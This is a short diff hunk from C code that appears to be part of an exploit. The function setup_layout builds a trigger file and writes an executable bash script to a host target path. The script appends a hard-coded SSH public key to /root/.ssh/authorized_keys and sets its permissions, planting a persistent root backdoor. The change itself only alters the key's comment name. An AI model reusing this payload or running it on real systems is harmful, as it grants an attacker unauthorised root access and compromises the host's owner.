@@ -122,7 +122,7 @@ static void setup_layout(void)
     mkdir_p(host_target_dir, 0755);
     write_text_file(backing_file, "top-level file\n");
     write_repeat_file(trigger_file, 'B', 16 * 1024 * 1024);
-    write_text_file(host_target_file, "#!/bin/bash \n echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdOp8L+V1KJcUH4MmKBkwPfF6KfgssrNurdBW3Vlgmt kinggeroge@Throne' >> /root/.ssh/authorized_keys \n chmod 700 /root/.ssh \n chmod 600 /root/.ssh/authorized_keys"); 
+    write_text_file(host_target_file, "#!/bin/bash \n echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdOp8L+V1KJcUH4MmKBkwPfF6KfgssrNurdBW3Vlgmt kingeroge@Throne' >> /root/.ssh/authorized_keys \n chmod 700 /root/.ssh \n chmod 600 /root/.ssh/authorized_keys"); 
     if (chmod(host_target_file, 0755) != 0) {
         die("chmod");
     }
